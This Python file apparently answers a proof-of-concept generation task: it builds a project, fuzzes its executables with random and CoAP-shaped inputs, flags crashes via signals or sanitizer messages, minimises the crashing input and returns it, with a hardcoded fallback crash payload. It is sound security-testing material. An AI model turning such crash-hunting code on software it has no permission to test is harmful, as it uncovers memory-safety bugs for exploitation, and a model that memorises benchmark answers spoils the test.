import os
import subprocess
import random
import sys


class Solution:
    def solve(self, src_path: str) -> bytes:
        rng = random.Random(0xC0A51337)
        try:
            exe_candidates = self._find_elf_execs(src_path)
            if not exe_candidates:
                self._build_project(src_path)
                exe_candidates = self._find_elf_execs(src_path)

            if not exe_candidates:
                return self._fallback_poc()

            targets = self._select_targets(exe_candidates)

            crash_input = None
            for bin_path in targets:
                crash_input = self._fuzz_binary(bin_path, rng)
                if crash_input is not None:
                    crash_input = self._minimize_input(bin_path, crash_input)
                    break

            if crash_input is None:
                return self._fallback_poc()

            return crash_input
        except Exception:
            return self._fallback_poc()

    def _find_elf_execs(self, root: str):
        execs = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    if not os.path.isfile(path):
                        continue
                    st = os.stat(path)
                    if not (st.st_mode & 0o111):
                        continue
                    if st.st_size < 4:
                        continue
                    with open(path, "rb") as f:
                        head = f.read(20)
                    if len(head) < 4 or head[:4] != b"\x7fELF":
                        continue
                    if len(head) >= 18:
                        e_type = int.from_bytes(head[16:18], "little")
                        if e_type not in (2, 3):
                            continue
                    execs.append(path)
                except OSError:
                    continue
        execs.sort()
        return execs

    def _build_project(self, src_path: str):
        cmds = []

        makefile = os.path.join(src_path, "Makefile")
        cmakelists = os.path.join(src_path, "CMakeLists.txt")

        if os.path.exists(makefile):
            cmds.append(["make", "-j8"])
        if os.path.exists(cmakelists):
            cmds.append(["cmake", "-S", ".", "-B", "build"])
            cmds.append(["cmake", "--build", "build", "-j8"])

        if not cmds:
            cmds.append(["make", "-j8"])

        for cmd in cmds:
            try:
                subprocess.run(
                    cmd,
                    cwd=src_path,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=60,
                    check=False,
                )
            except Exception:
                continue

    def _select_targets(self, exe_paths):
        prioritized = []
        keywords = ("coap", "message", "fuzz", "harness", "test")
        for p in exe_paths:
            base = os.path.basename(p).lower()
            if any(k in base for k in keywords):
                prioritized.append(p)
        if prioritized:
            prioritized.sort()
            return prioritized
        return exe_paths

    def _run_program(self, bin_path: str, data: bytes, timeout: float = 0.2) -> bool:
        try:
            proc = subprocess.run(
                [bin_path],
                input=data,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                timeout=timeout,
                check=False,
            )
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False

        rc = proc.returncode
        if rc is None:
            return False

        if rc < 0:
            return True

        stderr = proc.stderr or b""
        low = stderr.lower()
        if b"addresssanitizer" in low or b"asan" in low:
            return True
        if b"stack-buffer-overflow" in low:
            return True
        if b"stack smashing" in low:
            return True
        if b"segmentation fault" in low:
            return True

        return False

    def _initial_seeds(self, max_len: int):
        seeds = []
        seeds.append(b"")
        seeds.append(b"A")
        seeds.append(bytes([0x00]))
        seeds.append(bytes([0xFF]))
        seeds.append(b"A" * min(4, max_len))
        seeds.append(b"\x00" * min(21, max_len))
        seeds.append(b"\xFF" * min(21, max_len))

        # Simple CoAP-like seeds
        seeds.append(self._coap_seed(0, max_len))
        seeds.append(self._coap_seed(4, max_len))
        seeds.append(self._coap_seed(8, max_len))

        # Ensure unique
        uniq = []
        seen = set()
        for s in seeds:
            if s not in seen:
                seen.add(s)
                uniq.append(s)
        return uniq

    def _coap_seed(self, payload_len: int, max_len: int) -> bytes:
        if max_len < 4:
            return b"A" * max_len
        ver = 1
        tkl = 0
        type_ = 0
        code = 1  # GET
        msgid = 0x1234
        hdr = bytes(
            [
                (ver << 6) | (type_ << 4) | (tkl & 0x0F),
                code,
                (msgid >> 8) & 0xFF,
                msgid & 0xFF,
            ]
        )
        # Single Uri-Path option with 2-byte value "aa"
        opt = bytes([0xB2, ord("a"), ord("a")])
        payload = b""
        if payload_len > 0:
            payload = b"\xFF" + b"B" * payload_len
        data = hdr + opt + payload
        if len(data) > max_len:
            data = data[:max_len]
        return data

    def _random_bytes(self, rng: random.Random, max_len: int) -> bytes:
        length = rng.randint(1, max_len if max_len > 0 else 1)
        return bytes(rng.getrandbits(8) for _ in range(length))

    def _random_coap_like(self, rng: random.Random, max_len: int) -> bytes:
        if max_len < 4:
            return self._random_bytes(rng, max_len)

        ver = 1
        type_ = rng.randint(0, 3)
        tkl = rng.randint(0, 8)
        code = rng.randint(0, 255)
        msgid = rng.randint(0, 0xFFFF)

        header = bytes(
            [
                (ver << 6) | (type_ << 4) | (tkl & 0x0F),
                code,
                (msgid >> 8) & 0xFF,
                msgid & 0xFF,
            ]
        )

        remaining = max_len - len(header)
        if remaining <= 0:
            return header[:max_len]

        token_len = min(tkl, remaining)
        token = bytes(rng.getrandbits(8) for _ in range(token_len))
        remaining -= token_len

        data = bytearray()
        data.extend(header)
        data.extend(token)

        # Add some options
        num_opts = rng.randint(0, 4)
        for _ in range(num_opts):
            if remaining <= 0:
                break
            # Choose delta/len to encourage extended encodings
            delta_choice = rng.choice([rng.randint(0, 12), 13, 14])
            len_choice = rng.choice([rng.randint(0, 12), 13, 14])
            first = ((delta_choice & 0x0F) << 4) | (len_choice & 0x0F)
            # Avoid reserved 0xF nibble
            if (first >> 4) == 0xF:
                first &= 0x0F
            if (first & 0x0F) == 0xF:
                first &= 0xF0
            opt_bytes = bytearray([first])

            if 13 <= delta_choice <= 14:
                if delta_choice == 13:
                    opt_bytes.append(rng.randint(0, 255))
                else:
                    opt_bytes.append(rng.randint(0, 255))
                    opt_bytes.append(rng.randint(0, 255))

            if 13 <= len_choice <= 14:
                if len_choice == 13:
                    opt_bytes.append(rng.randint(0, 255))
                else:
                    opt_bytes.append(rng.randint(0, 255))
                    opt_bytes.append(rng.randint(0, 255))

            val_len = rng.randint(0, min(10, remaining))
            for _ in range(val_len):
                opt_bytes.append(rng.randint(0, 255))

            if len(opt_bytes) > remaining:
                opt_bytes = opt_bytes[:remaining]

            data.extend(opt_bytes)
            remaining = max_len - len(data)

        # Optional payload marker and payload
        if remaining > 0 and rng.random() < 0.5:
            data.append(0xFF)
            remaining -= 1

        if remaining > 0:
            payload_len = rng.randint(0, remaining)
            for _ in range(payload_len):
                data.append(rng.randint(0, 255))

        return bytes(data)

    def _mutate(self, rng: random.Random, data: bytes, max_len: int) -> bytes:
        if not data:
            return self._random_bytes(rng, max_len)
        b = bytearray(data)
        mutations = rng.randint(1, 4)
        for _ in range(mutations):
            choice = rng.randint(0, 3)
            if choice == 0 and len(b) > 0:
                idx = rng.randrange(len(b))
                bit = 1 << rng.randint(0, 7)
                b[idx] ^= bit
            elif choice == 1 and len(b) > 0:
                idx = rng.randrange(len(b))
                b[idx] = rng.getrandbits(8)
            elif choice == 2 and len(b) < max_len:
                idx = rng.randrange(len(b) + 1)
                b.insert(idx, rng.getrandbits(8))
            elif choice == 3 and len(b) > 1:
                idx = rng.randrange(len(b))
                del b[idx]
        if len(b) > max_len:
            del b[max_len:]
        return bytes(b)

    def _fuzz_binary(
        self,
        bin_path: str,
        rng: random.Random,
        max_iterations: int = 2000,
        max_len: int = 64,
    ):
        corpus = self._initial_seeds(max_len)

        # Try seeds first
        for data in list(corpus):
            if self._run_program(bin_path, data):
                return data

        for _ in range(max_iterations):
            if rng.random() < 0.2:
                candidate = self._random_coap_like(rng, max_len)
            else:
                base = rng.choice(corpus) if corpus else self._random_bytes(rng, max_len)
                candidate = self._mutate(rng, base, max_len)

            if self._run_program(bin_path, candidate):
                return candidate

            if len(corpus) < 1024 and rng.random() < 0.05:
                corpus.append(candidate)

        return None

    def _minimize_input(self, bin_path: str, data: bytes) -> bytes:
        best = data

        # Length minimization
        changed = True
        while changed:
            changed = False
            for new_len in range(len(best) - 1, 0, -1):
                candidate = best[:new_len]
                if self._run_program(bin_path, candidate):
                    best = candidate
                    changed = True
                    break

        # Byte simplification
        best_ba = bytearray(best)
        for i in range(len(best_ba)):
            orig = best_ba[i]
            for val in (0x00, 0xFF, ord("A")):
                if val == orig:
                    continue
                best_ba[i] = val
                if self._run_program(bin_path, bytes(best_ba)):
                    orig = val
                    break
            best_ba[i] = orig
        return bytes(best_ba)

    def _fallback_poc(self) -> bytes:
        # CoAP-like 21-byte payload as a generic fallback
        data = bytearray()
        # Header: ver=1, type=0, tkl=0, code=1, msgid=0x0001
        data.extend([0x40, 0x01, 0x00, 0x01])
        # Craft some option-like bytes with high deltas/lengths
        data.extend([0xDE, 0xAD, 0xBE, 0xEF])
        data.extend([0xEE, 0xEE, 0xEE, 0xEE])
        # Payload marker
        data.append(0xFF)
        while len(data) < 21:
            data.append(0x41)
        return bytes(data)
